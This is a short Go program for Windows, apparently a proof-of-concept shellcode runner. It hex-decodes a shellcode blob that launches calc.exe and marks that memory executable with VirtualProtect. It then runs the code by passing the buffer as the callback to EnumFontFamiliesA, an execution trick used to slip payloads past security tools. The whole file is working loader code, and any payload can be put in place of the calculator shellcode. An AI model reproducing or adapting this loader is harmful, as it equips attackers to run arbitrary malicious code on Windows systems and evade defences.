//go:build windows
// +build windows

package main

import (
	"encoding/hex"
	"unsafe"
	"golang.org/x/sys/windows"
)

var (
	kernel32 		 = windows.NewLazySystemDLL("kernel32.dll")
	user32 			 = windows.NewLazySystemDLL("user32.dll")
	gdi32 			 = windows.NewLazySystemDLL("gdi32.dll")
	
	VirtualProtect 	 = kernel32.NewProc("VirtualProtect")
	EnumFontFamilies = gdi32.NewProc("EnumFontFamiliesA")
	GetDC 			 = user32.NewProc("GetDC")
)

func main() {
	// Calc
	shellcode, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500")

	oldProtect := windows.PAGE_READWRITE
	VirtualProtect.Call((uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	ret,_,_ := GetDC.Call(uintptr(0))
	
	EnumFontFamilies.Call(ret, uintptr(0),  (uintptr)(unsafe.Pointer(&shellcode[0])), 0);
}
